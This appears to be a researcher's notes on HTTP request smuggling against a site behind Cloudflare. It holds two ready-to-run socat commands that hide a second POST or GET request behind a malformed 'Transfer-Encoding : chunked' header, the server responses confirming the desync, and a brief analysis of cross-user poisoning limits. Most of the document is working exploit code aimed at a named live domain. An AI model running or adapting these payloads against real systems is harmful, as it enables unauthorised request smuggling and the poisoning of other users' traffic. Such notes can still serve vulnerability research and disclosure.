# Cloudflare Payloads

## Payload 1 — HEAD + smuggled POST (desync confirmed)

```bash
cat <(printf "HEAD /en-US HTTP/1.1\r\nHost: easy.ac\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nAccept-Language: en-US;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36\r\nCache-Control: max-age=0\r\nContent-Length: 5\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nPOST /en-US HTTP/1.1\r\nHost: easy.ac") - | socat - SSL:easy.ac:443
```

### Result — TWO responses:
1. `HTTP/1.1 200 OK` (HEAD response, server: cloudflare)
2. `HTTP/1.1 405 Method Not Allowed` (smuggled POST processed, `Allow: GET, HEAD`)

The 405 includes a full Next.js error page body, confirming the backend processed the smuggled POST as a separate request.

---

## Payload 2 — HEAD + smuggled GET

```bash
cat <(printf "HEAD /en-US HTTP/1.1\r\nHost: easy.ac\r\n...\r\nContent-Length: 5\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nGET /en-US HTTP/1.1\r\nHost: easy.ac") - | socat - SSL:easy.ac:443
```

Result: Both 200 OK — but needs a newline in between responses.

---

## Analysis

Cloudflare forwards `Transfer-Encoding : chunked` (with space) without stripping it.
The backend processes the smuggled second request.
However, Cloudflare's `Connection: keep-alive` handling and response routing may limit cross-user poisoning.
